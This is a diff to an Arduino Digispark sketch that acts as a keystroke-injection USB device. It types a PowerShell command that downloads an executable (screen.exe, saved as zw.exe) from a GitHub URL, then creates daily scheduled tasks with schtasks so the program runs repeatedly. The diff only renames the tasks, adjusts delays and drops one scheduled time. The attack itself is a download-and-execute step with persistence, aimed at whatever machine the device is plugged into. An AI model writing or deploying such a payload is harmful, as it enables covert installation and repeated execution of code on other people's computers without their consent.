@@ -21,16 +21,17 @@ void loop() {
   DigiKeyboard.print("$client.DownloadFile(\"https://github.com/SharafMawjood/Screen-Rotator-Loop-Python-Script/raw/main/screen.exe\" , \"zw.exe\")");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
-  //create task shedule 10:12, 13:12, 17:12
+  //create task shedule 10:12, 13:12
   //and it run everyday
-  DigiKeyboard.print("schtasks /create /sc daily /tn MyTask /tr \"%USERPROFILE%\\zw.exe\" /st 10:12");
+  DigiKeyboard.print("schtasks /create /sc daily /tn MyTask1 /tr \"%USERPROFILE%\\zw.exe\" /st 10:12");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("schtasks /create /sc daily /tn MyTask /tr \"%USERPROFILE%\\zw.exe\" /st 13:12");
+  DigiKeyboard.delay(5);
+  DigiKeyboard.print("schtasks /create /sc daily /tn MyTask2 /tr \"%USERPROFILE%\\zw.exe\" /st 13:12");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("schtasks /create /sc daily /tn MyTask /tr \"%USERPROFILE%\\zw.exe\" /st 17:12");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5);
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
+
   for(;;){ /*empty*/ }
 }
